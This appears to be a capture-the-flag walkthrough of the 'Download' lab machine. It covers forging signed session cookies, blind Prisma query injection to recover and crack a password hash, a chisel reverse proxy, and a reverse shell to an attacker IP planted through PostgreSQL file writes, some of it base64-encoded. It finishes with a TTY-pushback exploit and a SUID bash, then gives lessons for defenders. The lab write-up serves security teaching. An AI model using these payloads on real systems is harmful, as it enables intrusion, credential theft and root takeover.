{ &#34;name&#34;: &#34;download.htb&#34;, &#34;version&#34;: &#34;1.0.0&#34;, &#34;description&#34;: &#34;&#34;, &#34;main&#34;: &#34;app.js&#34;, &#34;scripts&#34;: { &#34;test&#34;: &#34;echo \\&#34;Error: no test specified\\&#34; &amp;&amp; exit 1&#34;, &#34;dev&#34;: &#34;nodemon --exec ts-node --files ./src/app.ts&#34;, &#34;build&#34;: &#34;tsc&#34; }, &#34;keywords&#34;: [], &#34;author&#34;: &#34;wesley&#34;, &#34;license&#34;: &#34;ISC&#34;, &#34;dependencies&#34;: { &#34;@prisma/client&#34;: &#34;^4.13.0&#34;, &#34;cookie-parser&#34;: &#34;^1.4.6&#34;, &#34;cookie-session&#34;: &#34;^2.0.0&#34;, &#34;express&#34;: &#34;^4.18.2&#34;, &#34;express-fileupload&#34;: &#34;^1.4.0&#34;, &#34;zod&#34;: &#34;^3.21.4&#34; }, &#34;devDependencies&#34;: { [...SNIP...] } } &#x1f352; If you answered &ldquo;they gave an author name but nothing else?&rdquo;, you&rsquo;d be right. If we&rsquo;re lucky, wesley is the username of the developer.
Checking out app.js reveals something pretty big: the developer left the cookie-signing key right there in plaintext!
app.use((0, cookie_session_1.default)({ name: &#34;download_session&#34;, keys: [&#34;8929874489719802418902487651347865819634518936754&#34;], maxAge: 7 * 24 * 60 * 60 * 1000, })); I already knew about the download_session cookie, and it can be read directly from the browser (or freely created as the base-64 encoding of a json object). But having this key means that I can create arbitrary download_session cookies and produce a valid matching download_session.sig cookie! More can be learned about cookie_sesssion from the official documentation.
What&rsquo;s really important about this cookie_session middleware is that it uses no database. It relies only on the cookies borne by the client. The implication of that is, if I&rsquo;m able to forge a valid cookie and signature, then there will be no further verification on the cookie and I can effectively present the cookie as my own.
So how does the cookie find its way into the application logic? All happens in the POST /auth/login endpoint in routers/auth.js:
const hashPassword = (password) =&gt; { return node_crypto_1.default.createHash(&#34;md5&#34;).update(password).digest(&#34;hex&#34;); }; [...SNIP...] router.post(&#34;/login&#34;, async (req, res) =&gt; { // (req.body is just username : password in plaintext) const result = LoginValidator.safeParse(req.body); if (!result.success) { res.flash(&#34;error&#34;, &#34;Your login details were invalid, please try again.&#34;); return res.redirect(&#34;/auth/login&#34;); } const data = result.data; const user = await client.user.findFirst({ where: { username: data.username, password: hashPassword(data.password) }, }); if (!user) { res.flash(&#34;error&#34;, &#34;That username / password combination did not exist.&#34;); return res.redirect(&#34;/auth/register&#34;); } // Altering req.session implicitly includes a Set-Cookie header req.session.user = { id: user.id, username: user.username, }; res.flash(&#34;success&#34;, &#34;You are now logged in.&#34;); return res.redirect(&#34;/home/&#34;); }); Upon successful authentication, the download_session and download_session.sig cookies are set by the cookie-session middleware (since a keys object was included in its contructor, in app.js)
The next big revelation from the source code is about how the session variable (both cookies together) eventually gets used. This comes from the GET /home endpoint in routers/home.js:
router.get(&#34;/&#34;, auth_1.default, async (req, res) =&gt; { const files = await client.file.findMany({ where: { author: req.session.user }, select: { id: true, uploadedAt: true, size: true, name: true, private: true, authorId: true, author: { select: { username: true, }, }, }, }); res.render(&#34;home.njk&#34;, { files }); }); The whole user session variable is included in the query! This is a very big deal. Since Prisma uses json objects for building the query, and the user session variable is parsed as a json object, this where clause can be abused for injecting arbitrary Prisma query clauses (as long as the injected code can legally be included in a where clause).
All I need to do is find a way to forge a valid cookie containing arbitrary user data.
USER FLAG Forging the Cookie My goal now is to make an application that, given an id and usename, will create validdownload_session and download_session.sig cookies. Ideally, whatever I make will be useful for performing that Prisma query injection mentioned earlier.
To accomplish this, I think the best way to create a forged cookie is by using the application itself! After all, I already have the source code and signing key. So why not just adapt the existing application to suit my needs? I&rsquo;ll make a thinned-down version of the Express webserver from the application, made only to generate and sign a cookie.
After quite a bit of work, I was able to do exactly that. It&rsquo;s a single-page site with a simple form on it to accept a json-like object and create the download_session and download_session.sig cookies, and also output any current cookies to the page. This is the layout of the project folder:
The page index.html has a little js script to output the cookies to the page, and a form with action POST /auth that accepts just a single line of json-like text. The main script, app.js, is responsible for creating the cookie-session and setting its parameters. The routerauth.js is where the cookie is created, allowing cookie-session to sign the cookie in the same way that the Download application does, redirecting the user back to the index.html page after setting the cookie.
The big &ldquo;aha&rdquo; moment when creating this was realizing that the &ldquo;flashes&rdquo; part of the cookie is actually required.
The most important bit is inside auth.js:
[...SNIP...] router.post(&#34;/&#34;, async (req, res) =&gt; { try { const user = eval( &#39;(&#39; + req.body.user + &#39;)&#39; ); req.session.flashes = { &#34;info&#34;:[], &#34;error&#34;:[], &#34;success&#34;:[&#34;You are now logged in.&#34;] }; req.session.user = { id: user.id, username: user.username, }; } catch (error) { req.session.user = {id: -1, username:&#34;Error: Invalid input&#34;}; console.log(error); } return res.redirect(&#34;/&#34;); }); [...SNIP...] Instead of doing a simple JSON.parse(), I&rsquo;m using eval so that the input can be much more lax about quotation marks and strict json formatting. Yeah, secure by design right? &#x1f605;
&#x1f6a8; Don&rsquo;t EVER do this in a production system or anything that might be turned into production code.
The other important part is in app.js, which had to be adjusted to set httpOnly to false:
[...SNIP...] app.use((0, cookie_session_1.default)({ name: &#34;download_session&#34;, keys: [&#34;8929874489719802418902487651347865819634518936754&#34;], httpOnly: false, maxAge: 7 * 24 * 60 * 60 * 1000, })); app.use(express_1.default.urlencoded({ extended: false })); app.use((0, cookie_parser_1.default)()); app.get(&#34;/&#34;, (req, res) =&gt; { res.sendFile(\`\${__dirname}/views/index.html\`); }); [...SNIP...] You can find the whole Express-Cookie-Signer tool on my github repo, if you want to download and try it out. I ran it using the following command:
node app.js download_session &#34;8929874489719802418902487651347865819634518936754&#34; That command will start up a webserver on http://localhost:3000, which should look like this:
As a quick proof-of-concept, I was able to access my own account by using one of these forged session cookie pairs. This is using the signed cookie resulting from entering my actual id and username:
{ &#34;user&#34;: { &#34;id&#34;: 16, &#34;username&#34;: &#34;jimbob&#34; }, &#34;flashes&#34;: { &#34;info&#34;: [], &#34;error&#34;: [], &#34;success&#34;: [ &#34;You are now logged in.&#34; ] } } Excellent. That seemed to work perfectly. One thing to note is that, if I provide the wrong user ID, the web app claims I am logged-in but I can&rsquo;t actually see any files.
With that working, I&rsquo;ll try to do what I&rsquo;ve been building up to - the Prisma query injection. For this, I&rsquo;ll provide two parameters each that should yield any existing user (ID greater than 0 and username not &ldquo;randomname&rdquo;):
{ &#34;user&#34;: { &#34;id&#34;: { &#34;gt&#34;: 0 }, &#34;username&#34;: { &#34;not&#34;: &#34;randomname&#34; } }, &#34;flashes&#34;: { &#34;info&#34;: [], &#34;error&#34;: [], &#34;success&#34;: [ &#34;You are now logged in.&#34; ] } } That worked perfectly! I can see all of the users that have submitted items. They include:
AyufmApogee Pestiferous Apoplectic Vivacious Rooirhebok Hindermate Logorrhea WESLEY &#x2705; Jalouse StrachanMilt Bold_pecAplomb Tabific ZitaShneee Antilogism Jimbob &#x1f63a; It&rsquo;s interesting to note that there are 15 users. My user ID as jimbob is 16. Unfortunately, even though very many files are shown, I cannot download any of the files marked private (given the application logic, this makes sense - to do that, I need a matching user ID to whomever uploaded the files). Also, all of the files that I was able to download just contain placeholder data - nothing interesting or useful.
Prisma Query Injection I already saw from package.json that WESLEY is likely the developer. So, I&rsquo;ll try using their username and enumerating the user ID. From what I saw earlier, simply providing the right username should yield a &ldquo;successful&rdquo; login, but won&rsquo;t actually list any files. When I find the right user ID (very likely some number less than 16), hopefully I&rsquo;ll be able to see WESLEY&rsquo;s private file.
Starting at user ID = 0, I started counting up. I was successful with user ID = 1:
{ &#34;user&#34;: { &#34;id&#34;: 1, &#34;username&#34;: &#34;WESLEY&#34; }, &#34;flashes&#34;: { &#34;info&#34;: [], &#34;error&#34;: [], &#34;success&#34;: [ &#34;You are now logged in.&#34; ] } } Great! And this is also a good proof-of-concept that I&rsquo;m able to guess at fields about the user and obtain a credible result. It&rsquo;s almost like doing a blind SQL injection. But what will the injection be? From auth.js, I already know that there is a password field stored alongside the username:
const hashPassword = (password) =&gt; { return node_crypto_1.default.createHash(&#34;md5&#34;).update(password).digest(&#34;hex&#34;); }; [...SNIP...] router.post(&#34;/login&#34;, async (req, res) =&gt; { const result = LoginValidator.safeParse(req.body); if (!result.success) { res.flash(&#34;error&#34;, &#34;Your login details were invalid, please try again.&#34;); return res.redirect(&#34;/auth/login&#34;); } const data = result.data; const user = await client.user.findFirst({ where: { username: data.username, password: hashPassword(data.password) }, }); [...SNIP...] From this code, it is apparent that there is a hashed password stored alongside the username. Also, it shows that the password is stored as the hex digest of an MD5 hash.
So how can I go about finding the password? Well, since the GET /home endpoint reads-in the whole user object, it is possible to simply include extra AND clauses to the query. Using the Prisma middleware, this just means including an extra &ldquo;password&rdquo; field in the query. Since Prisma has a startsWith operator, it reduces the password search significantly:
{ &#34;user&#34;: { &#34;id&#34;: 1, &#34;username&#34;: &#34;WESLEY&#34;, &#34;password&#34;: { &#34;startsWith&#34;: &#34;0&#34; } }, &#34;flashes&#34;: { &#34;info&#34;: [], &#34;error&#34;: [], &#34;success&#34;: [ &#34;You are now logged in.&#34; ] } } How can I do this efficiently though? I already made that cool Cookie-Signer tool, but it takes a lot of clicking and copy-pasting - far more than is feasible for this search.
I tried writing an API endpoint for the Cookie-Signer tool, but unfortunately due to the sequence in which cookies are set on the client, this was not successful. Maybe with a bit of a redesign.
Instead, I wrote a python script that uses Requests to interact with the Cookie-Signer tool to obtain a signed cookie.
The short answer is&hellip; script it! I already made a tool that signs any provided JSON-like object, allowing me to use forged cookies. But now, I need to use it for brute-forcing a password. So why not extend the functionality of the webserver to accomodate? For this, I added an extra endpoint to my Cookie-Signer tool, GET /auth/api.
To automate a brute-force attack on the password, I must write a script that checks each character one-by-one. After much tinkering, the end result was a script following this procedure:
Generate JSON-like payloads, url-encode them, and submit them to http://localhost:3000/auth/api for signing. http://localhost:3000 responds with the two forged cookies. Send a request to the actual target (http://download.htb/home) using the two forged cookies. http://download.htb responds with either the /home page or a redirection to /auth/login Parses the response to check if the JSON-like payload was &ldquo;valid&rdquo; The final copy of this script is available in the same repo on Github as its counterpart, Express-Cookie-Signer. Since I modified the script to be fairly general-purpose, it must be used with specific arguments:
Since WESLEY seems to be the web app developer, it makes most sense to obtain their password. Running the script as follows finds the password hash for WESLEY:
./EnumerateSignedCookie.py http://download.htb/home/ &#39;{ &#34;user&#34;: { &#34;id&#34;: 1, &#34;username&#34;: &#34;WESLEY&#34;, &#34;password&#34;:{&#34;startsWith&#34;:&#34;FUZZ&#34;}}, &#34;flashes&#34;: { &#34;info&#34;: [], &#34;error&#34;: [], &#34;success&#34;: [ &#34;You are now logged in.&#34; ] } }&#39; \\ --contains &#39;Hey WESLEY&#39; \\ --omits &#39;No files found&#39; \\ --hex-only The password hash that the tool found was: f88976c10af66915918945b9679b2bd3. Since I already know that this is an MD5 hash, this should be very easy to crack:
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt In less than a second, I had a result:
For copy-pasting, that credential is wesley : dunkindonuts
Hoping for good ol&rsquo; credential-reuse, I tried this password in SSH:
Alright! Success &#x1f389;
The SSH connection drops you into /home/wesley, adjacent to the user flag. Simply cat it out for the points:
cat user.txt ROOT FLAG User Enumeration: wesley I&rsquo;ll follow my usual Linux User Enumeration strategy. To keep this walkthrough as brief as possible, I&rsquo;ll omit the actual procedure of user enumeration, and instead just jot down any meaningful results:
wesley cannot sudo at all. Searching for writable locations pointed out that wesley has a nano search history file. Possible clues inside: Access to some useful applications on the box: nc, netcat, socat, curl, wget, python3, perl, tmux Checking netstat revealed that there are two other ports open locally, 3000 and 5432: Port 5432 is likely PostgreSQL; The Express server is on TCP port 3000. There might be excessive capabilities applied to gstreamer: PostgresSQL config file found: config_file=/etc/postgresql/12/main/postgresql.conf &ndash;&gt; Possible DB creds found in process tree: postgres: 12/main: download download 127.0.0.1(58550) idle Suspicious python script currently running as root: /root/venv/bin/python3 /root/management.py pspy turned up some weird things that are happening periodically: Chisel SOCKS Proxy During user enumeration I found a locally-exposed port 5432 (probably PostgreSQL). To access it, I&rsquo;ll set up a SOCKS proxy using chisel. I&rsquo;ll begin by opening a firewall port and starting the chisel server:
&#x261d;&#xfe0f; Note: I already have proxychains installed, and my /etc/proxychains.conf file ends with:
... socks5 127.0.0.1 1080 #socks4 127.0.0.1 9050 sudo ufw allow from $RADDR to any port 9999 proto tcp ./chisel server --port 9999 --reverse --key s4ucys3cret Then, on the target machine, start up the chisel client and background it:
./chisel client 10.10.14.2:9999 R:1080:socks &amp; To test that it worked, I tried a round-trip test (attacker -&gt; target -&gt; attacker) to access loading the index page from my local python webserver hosting my toolbox:
proxychains whatweb http://10.10.14.2:8000 Success &#x1f44d;
PostgreSQL I tried connecting to PostgreSQL via the chisel proxy, and (of course) was presented with a password prompt. This got me questioning myself - did I see any database connection string in the download Express app? I don&rsquo;t think I did - but clearly it must be storing the connection string somewhere&hellip;
A little research revealed that Prisma either uses a connection specified in a .yml file (prisma.yml) or in a .env file. I&rsquo;ll check for those:
find / -type f -name &#34;prisma.yml&#34; 2&gt;/dev/null find / -type f -name &#34;.env&#34; 2&gt;/dev/null I didn&rsquo;t think I would find a .env file though - the download app does not import dotenv or anything like it&hellip; A little more research indicated that I might be able to use Express to expose the configuration:
curl http://localhost:3000/prisma-config Nope, just a 404 page. &#x1f914; My only conclusion is that the connection string is finding it&rsquo;s way into the environment variables in some other way. I&rsquo;ll keep enumerating and probably circle back to checking this out &#x1f6a9;
Pspy Results Followup There were a few notable / weird things that pspy uncovered:
Periodically, root runs manage-db, which seems to kick-off several other processes.
Unfortunately, I cannot locate the manage-db file, so it&rsquo;s probably in a location that wesley cannot access.
On the same cycle, two services are checked for their status: postgresql and download-site.
What&rsquo;s the point of this? It&rsquo;s a little hard to tell with just pspy, but it doesn&rsquo;t seem like the results are being used in any way. Perhaps this is only here as a hint?
Also on the same cycle, root is logging in as postgres and performing a variety of actions. These include:
Running psql using perl - why? Use ldd to check the dependencies of /usr/lib/postgresql/12/bin/psql Runs /usr/lib/postgresql/12/bin/psql by invoking it using /lib64/ld-linux-x86-64.so.2 (which is one of the dependencies listed when running ldd) (1) seems like a dead-end; I can&rsquo;t locate the file and definitely can&rsquo;t execute it.
(2) is a lot more interesting. As wesley, I can check the status of the services as well:
Ok, so postgresql is active but exited, with an ExecStart=/bin/true line. This means that the service doesn&rsquo;t actually do anything; it&rsquo;s kind of a &lsquo;dummy&rsquo; entry. The service definition is at /lib/systemd/system/postgresql.service.
The download-site service is active and running. It is clearly a service to run the webserver, probably when the system starts. It&rsquo;s service definition is at /etc/systemd/system/download-site.service.
Reading the two service definition files is even more enlightening:
Aha! There&rsquo;s that database connection string I&rsquo;ve been looking for! This shows that the database is also called download, and the postgresql credential used by the webserver is download : CoconutPineappleWatermelon.
I&rsquo;m wondering why Trufflehog missed this one &#x1f615;
Going back to the list above, (3) is also very peculiar. Why would the root user actually log in to postgres just to do some database administation?
This is an odd way of behaving, and is almost certainly a clue as to the way forward. For now, I&rsquo;ll try out those database credentials and circle back to investigating this right after the database &#x1f6a9;
Enumerating PostgreSQL Now that I have a credential, I&rsquo;ll try logging into the database itself:
proxychains psql -h localhost -U download -d download List the tables:
SELECT table_name FROM information_schema.tables WHERE table_schema = &#39;public&#39;; table_name -------------------- _prisma_migrations User File (3 rows) Describe the tables (just for context):
SELECT column_name, data_type, character_maximum_length FROM information_schema.columns WHERE table_name = User; SELECT column_name, data_type, character_maximum_length FROM information_schema.columns WHERE table_name = File; Get the contents:
Well, there&rsquo;s that user that was unaccounted-for: &ldquo;MotelKebbie&rdquo;. What else can we do with this database? I&rsquo;ll check the roles available with \\du:
Very interesting! As download I have the ability to write files &#x1f911; This opens up all kinds of possibilities. I&rsquo;ll check where postgres can write to.
find / -user postgres 2&gt;/dev/null | grep -v &#39;^\\(/sys\\|/proc\\|/run\\)&#39; Note: the directory listed at the top is the home directory of postgre.
Writing to postgre&rsquo;s Home Normally, when a user logs in, the system runs their .profile (or also their .bashrc file); usually just a good way to establish environment variables, set the PATH, write aliases, etc. As seen earlier in pspy, every minute or so, root logs in as postgres. It seems plausible that this login would also source the .profile or .bashrc file, if either existed.
I&rsquo;ll attempt to write a .profile file that contains a reverse shell. Since it will probably be ran every minute, it would also be smart to include some kind of mechanism to not open a new shell if one is already open. This is the script I wrote to accomplish that:
lock=&#34;/var/lib/postgresql/shellopen&#34; host=&#34;10.10.14.2&#34; port=&#34;4444&#34; poppa_shell() { local addr=$1 local port=$2 cmd=&#34;/bin/bash -i &gt;&amp; /dev/tcp/$addr/$port 0&gt;&amp;1&#34; echo &#34;shells yeah&#34; bash -c $cmd } # If shellopen doesnt exist yet, there&#39;s definitely no shell open if [ ! -f $lock ]; then echo &#34;open&#34; &gt; $lock poppa_shell &#34;$host&#34; &#34;$port&#34; else # If it does exist, but doesn&#39;t have the word &#34;open&#34; in it, open one content=$(&lt;&#34;/home/kali/Box_Notes/Download/shellopen&#34;) if [ &#34;$content&#34; != &#34;open&#34; ]; then echo &#34;open&#34; &gt; $lock poppa_shell &#34;$host&#34; &#34;$port&#34; fi fi The psql command to write a file is like this (from Hacktricks):
copy (select convert_from(decode(&#39;&lt;ENCODED_PAYLOAD&gt;&#39;,&#39;base64&#39;),&#39;utf-8&#39;)) to &#39;/just/a/path.exec&#39;; To prepare, I&rsquo;ll base-64 encode my .bashrc file and open a socat listener:
base64 -w 0 .bashrc &gt; bashrc.b64 cat bashrc.b64 [ COPY ] sudo ufw allow from $RADDR to any port 4444 proto tcp socat -d -d TCP-LISTEN:4444 STDOUT Then I&rsquo;ll perform the file write from within psql:
copy (select convert_from(decode(&#39;IyB+L...[SNIP]...ZpCg==&#39;,&#39;base64&#39;),&#39;utf-8&#39;)) to &#39;/var/lib/postgresql/.bashrc&#39;; The file write was successful, at least for a moment. Shortly after this screenshot, it seems the file was deleted:
Worse yet, it never opened a reverse shell. Maybe it&rsquo;s because I used .bashrc? I&rsquo;ll try .profile instead. &mdash;&gt; Nope, that didnt work either.
Ah, I see the problem: the base64 encoding then decoding blew away all of the newlines. Thankfully, I can just add semicolons to the script and use a little sed to fix it:
sed &#39;:a;N;$!ba;s/\\n/ /g&#39; .bashrc | sed &#39;s/ / /g&#39; &gt; bashrc-oneline base64 -w 0 bashrc-oneline &gt; bashrc-oneline.b64 I tried this one, and waited for the reverse shell to trigger, but it still did not work. Once again, I&rsquo;ll try .profile instead. Still nothing.
Alright, maybe I&rsquo;ll try a much simpler command, just a reverse shell written as one line. I tried it as .bashrc&hellip; still nothing. Then changed it to .profile, and it finally popped a shell!
And the shell died after about 5s &#x1f480;
For copy-pasting, the database copy command that was successful was this:
copy (select convert_from(decode(&#39;YmFzaCAtYyAiL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIvNDQ0NCAwPiYxIjsgCg==&#39;,&#39;base64&#39;),&#39;utf-8&#39;)) to &#39;/var/lib/postgresql/.profile&#39;; Persistence as postgres This section was not useful. If you&rsquo;re short on time, please skip this. However, if you want the extra context for how I rooted this box then keep reading, you glorious nerd &#x1f913;
I don&rsquo;t honestly think it will work, but I&rsquo;ll try planting an ssh key into postgres&rsquo;s home directory.
&hellip;actually, it did work! Long after my reverse shell closed, I&rsquo;m still connected with SSH:
But this is a mixed blessing&hellip; it seems that something about creating this connection has caused the cron jobs to stop working. To test if it&rsquo;s the reverse shell, I&rsquo;ll try planting the SSH key without using a reverse shell - just a file write with psql.
For copy-pasting, here is the psql command to write the updated .profile:
copy (select convert_from(decode(&#39;YmFzaCAtYyAibWtkaXIgLXAgL3Zhci9saWIvcG9zdGdyZXNxbC8uc3NoICYmIGVjaG8gJ2MzTm9MWEp6WVNCQlFVRkJRak5PZW1GRE1YbGpNa1ZCUVVGQlJFRlJRVUpCUVVGRFFWRkRPVFZRYW01aGNFaExNMEk1TUZGblluQTFWVFZOZVdaSk5sQk1kMGd4WWpoNmVWQm5OblpzWVdocEwzTlBaM0pIYWt0RldYaG5XbGg1TXl0b04xUkZkRWxIVm5jNVlVWmlRVEZPVWsxRWJqaFlOVXgwY1RkaU5tcHFhM2cyT0ZveWMxZElRV05FYUROMk1IUklNa05JT1VGRFV6STBibll4T1dsUVEwTlFWblZwU1ZCQk1uVjJWbTVFVGpGd1dFdEtaMEpLUkVoU0wwUXZhVEEzU201Vk5GWkNRVUYyWTIxQ1luRXdOekZGTDNWTWEySjVNa05TWlZkNVQzTnhjVnBTYkZSWFptMDFPRFZ1UlhrMFFUQmlUMDVQTTJwMWExWkhSRVZLVGxoNlRsRmxZVTV3T0hWeE9WSmFWbHBDS3pFNFRWZEZaemhFWkVZelpXNUdUM1ZWTVdWVVFVUXhWbnBhWm1wWlYzUlJWVlJ1VEZWaFQwZGlOVFl2WVhwdGVrTk5iazlsUm1ZMk9GQmtkVkI0WmpFeFJGUnJaWGxaUVhabFprRjVVelZ6VUc5aWVUUXhhblptV0RoWlNtZG9NM0Z5TWl0TWJXMHpPVVJZTkRSdVEzRnlVVmdyZGsxU1p6bFZUREpPU0ZSV2RUaFpiVzVSVEdGM1RtVXJiVzVxT1ZZdlMzRkhLM2hrU2tKTVUwdFBNV1ZQZVRoR2NFdzViRzkzZEhwbldsUjJSa3cwUkhNeE5GcDBhbE15UkZKeFZqWnlibGgyWTJKRlVuSlRiWGh1T0hKd01GcGtXR1JDU2pkR2JIZ3lRMm9yYm5rcmFVYzFTVlpZT0dGRU5YVkZOWGd5ZFRGc1JVVkJUakpMYkVjM05UQmtaMUUxV0U5TWVuaE5NMHhzY0dWS01uZGFWbTFHVjNaQ1pqQTVSMkZPZUV4UE1qSTBkR0pvVEROTlFXTkxNWEJvVlRGdlNHczFWbWhWWm1wcVoyWkxTbUYzU2tKVVNFUlRjVFIyYTNaalpqaDBhV3RsU3pkdmJqTTFkMHR6WVZoQ1IzaHJTME0zVUdaU1owdE1NMUJpWlcxNFpIRkxUa1ozTkhJd2IzUlpNVVpXYlc5dk5YWnZlRVJTV0VkaGVUVjJRVXcwZERWSFVWbEZRVFZsUkZWMk0zaDZOekZKZEV3eU5HdEZhVU4yZHpOQlUzaEpPR2RNVXpKd2NWRTlQU0JyWVd4cFFHdGhiR2tLJyB8IGJhc2U2NCAtLWRlY29kZSA+IC92YXIvbGliL3Bvc3RncmVzcWwvLnNzaC9hdXRob3JpemVkX2tleXMiIAo=&#39;,&#39;base64&#39;),&#39;utf-8&#39;)) to &#39;/var/lib/postgresql/.profile&#39;; I used the above command in psql, then (as wesley) watched for the creation of the ssh directory with watch ls -la /var/lib/postgresql. When I saw the directory appear, I quickly logged in as postgres over SSH using the rsa key I had already created.
😮‍💨 Unfortunately this still prevents the cron jobs from running. I&rsquo;ll have to reset the box again and change strategy.
TTY Pushback / Hijacking There&rsquo;s a classic exploit for unix-based systems called a TTY Pushback. It&rsquo;s used in exactly the scenario that this box presents: where the root user is logging in to a low-privilege user (postgres, in this case) and issuing commands. The exploit relies on the fact that, when a login shell is invoked, the same tty device is re-used. A malicious program can be written to kill the current process (the low-privilege shell), returning the process back to root, then mirror a command into the root shell. The whole TTY Pushback idea is described very well in Guillaume Quéré&rsquo;s article.
Since there is Python on the target, I should be able to almost copy-paste the PoC code from that article.
To make things a little more streamlined, I&rsquo;ve been using a little bash one-liner to assemble the psql file-write command. This puts &lt;shell_command&gt; into the .profile of postgres:
cmd=\`echo &#39;&lt;shell_command&gt;&#39; | base64 -w 0\`; echo &#34;copy (select convert_from(decode(&#39;$cmd&#39;,&#39;base64&#39;),&#39;utf-8&#39;)) to &#39;/var/lib/postgresql/.profile&#39;;&#34; The exploit itself is the following (copied from the article), exploit.py:
#!/usr/bin/env python3 import fcntl import termios import os import sys import signal os.kill(os.getppid(), signal.SIGSTOP) for char in sys.argv[1] + &#39;\\n&#39;: fcntl.ioctl(0, termios.TIOCSTI, char) As wesley, I wrote the above python script into a file at /tmp/exploit.py. Thankfully, I&rsquo;ve already discovered a way to execute code as postgres - by writing a single line into their .profile. That way, when root logs in as postgres, the code is executed automatically.
First, I&rsquo;ll try simply copying the flag and making it readable:
python3 /tmp/exploit.py &#34;cp /root/root.txt /tmp/Tools/root.txt &amp;&amp; chmod +r /tmp/Tools/root.txt&#34; Then ran that command through my bash one-liner to convert it to a file-write that I can copy into psql:
cmd=\`echo &#39;python3 /tmp/exploit.py &#34;cp /root/root.txt /tmp/Tools/root.txt &amp;&amp; chmod +r /tmp/Tools/root.txt&#34;&#39; | base64 -w 0\`; echo &#34;copy (select convert_from(decode(&#39;$cmd&#39;,&#39;base64&#39;),&#39;utf-8&#39;)) to &#39;/var/lib/postgresql/.profile&#39;;&#34; I copied the command that produced into psql, and from the wesley SSH connection I verified that the .profile file was written. Then I started up pspy and (in another pane) ran watch ls -la /tmp/Tools&hellip;
&hellip; and then it appeared! the flag was successfully copied! &#x1f601;
Wonderful! &hellip;until I realized that the file permissions were still such that wesley couldnt read it. &#x1f631; What? Why would half of the command (the cp part) succeed and half of it (the chmod part) fail?
I tried several other things to get the permissions to work so that wesley could read the root flag:
Have wesley create a file beforehand to hold the flag contents. Then use the append / stream operator to add the flag onto that existing file, using passing command like this to exploit.py:
cat /root/root.txt &gt;&gt; /tmp/Tools/readable-flag.txt Try changing the owner of the flag to wesley, instead of the mode bits:
cp /root/root.txt /tmp/Tools/root.txt &amp;&amp; chown wesley:wesley /tmp/Tools/root.txt Try doing it in two steps, by copying the file first, then later changing the permissions:
cp /root/root.txt /tmp/Tools/root.txt then
chmod 666 /tmp/Tools/root.txt I even tried prepending sudo to that last one, to see if it would make a difference.
During one of these tests, I noticed something odd in pspy about how the exploit was running:
For some reason, when exploit.py is running, there is an &ldquo;n&rdquo; being added to the end of each command! That is why only the first part of each command was working: there&rsquo;s an extra letter in there thwarting my attempts to change permissions.
I solved this easily by adding a semicolon and a space to the end of the command, for example changing the owner of the flag. For example, chown wesley:wesley /tmp/Tools/root.txt becomes chown wesley:wesley /tmp/Tools/root.txt; :
For copy-pasting, the correct code is this:
copy (select convert_from(decode(&#39;cHl0aG9uMyAvdG1wL2V4cGxvaXQucHkgImNob3duIHdlc2xleTp3ZXNsZXkgL3RtcC9Ub29scy9yb290LnR4dDsgIgo=&#39;,&#39;base64&#39;),&#39;utf-8&#39;)) to &#39;/var/lib/postgresql/.profile&#39;; Finally, this worked, and I was able to cat out the flag for those glorious root flag points &#x1f4b0;
cat /tmp/Tools/root.txt EXTRA CREDIT: FULL PWN Creating an SUID Bash The simplest way to gain a persistent method to log in as root seems like creating an SUID copy of bash that is accessible by wesley. The process should be very similar to how I got the flag. I&rsquo;ll get root to make a copy of bash (so that the owner is still set to root) then simply set the SUID bit.
cp /usr/bin/bash /tmp/Tools/bash &amp;&amp; chmod u+s /tmp/Tools/bash; Remember to leave a space after the semicolon, too.
I ran this code through the bash one-liner to produce the following command for psql:
copy (select convert_from(decode(&#39;cHl0aG9uMyAvdG1wL2V4cGxvaXQucHkgImNwIC91c3IvYmluL2Jhc2ggL3RtcC9Ub29scy9iYXNoICYmIGNobW9kIHUrcyAvdG1wL1Rvb2xzL2Jhc2g7ICIK&#39;,&#39;base64&#39;),&#39;utf-8&#39;)) to &#39;/var/lib/postgresql/.profile&#39;; Then I entered the command into psql and waited. After a minute or so, I saw this roll across my pspy output:
&#x1f370; Awesome! Finally got that SUID bash. Now just run it with the -p flag to become root:
LESSONS LEARNED Attacker It&rsquo;s your cookie. Cookies are stored client-side and (when coupled with weak cryptography) can be abused to forge new sessions, change what user you&rsquo;re logged-in as, etc. There are many possibilities with this attack. A great tool for performing this is cookie-monster (mentioned earlier). The main takeaway is to analyze whether or not there is some kind of server-side verification of a cookie: if there isn&rsquo;t, anything is fair game.
Remember the classics. At first glance, the vulnerability used to secure wesley&rsquo;s password seemed a bit obscure. But when you take a step back, it&rsquo;s clear that it the exploit was actually just a different take on the good &lsquo;ol Blind SQL Injection. We set up a query (based on a parameter we could control) that would yield a result that indicated a match or a non-match of that parameter. The fact that the injection had to take place via a signed cookie and used Prisma Client instead of regular SQL.
To be fair, I should probably just call this &ldquo;query injection&rdquo;, because the same concept would apply equally well to a NoSQL database.
Remember the fingerprint of the technologies you&rsquo;ve found. I had identified early on, just by using Whatweb, that the website was using Express (and thus NodeJS). However, during my early attempts in checking for an LFI, I neglected this fact. I had made sure that various pages such as index.html were in my LFI wordlists, but I had overlooked the one true essential of a NodeJS project: package.json&hellip; I won&rsquo;t make that mistake again any time soon.
Explore the website before or during enumeration. It&rsquo;s easy to get lost in the details and waste a lot of time with enumerating a website. It could be that you&rsquo;ve discovered an API and want to see what endpoints are there. It all starts innocently, but once you find those endpoints, you&rsquo;re going to want to try fuzzing parameters on them&hellip; and when you find parameters you&rsquo;re going to want to fuzz some values&hellip; Suffice to say, it&rsquo;s a deep, dark, hole. My best advice is to focus on breadth, and let depth wait until you see an actual need for it (which does happen, too!).
Establish a proxy as soon as you get an SSH connection. It&rsquo;s a simple extra step that allows so many other things to happen much more easily, because you can rely on the tools you have on your own machine. Want to practice living off the land? then don&rsquo;t do a proxy. In every other case though, I&rsquo;d highly recommend it. There are many ways to do this, and I&rsquo;m still learning just the popular ones, but I can already tell the skill is invaluable.
Defender Don&rsquo;t leave secrets in the source code. In the app.js file for the Download web app, the cookie-signing key was left directly in the source code. Thankfully, Github checks for this type of accident automatically and by default now, so it&rsquo;s pretty hard to screw up. A better way to do this is to have the system rotate between keys, or to load the key from an .env file - but even both of those are just a minor added layer of protection.
Never trust the user. Any authorization system that relies only on data held by the client is doomed to be broken. At best, such a system is breakable by difficult brute-forcing. At worst, it can be trivially bypassed. This web app on this box relied on the cookie-session module, which is one of these systems susceptible to brute-forcing.
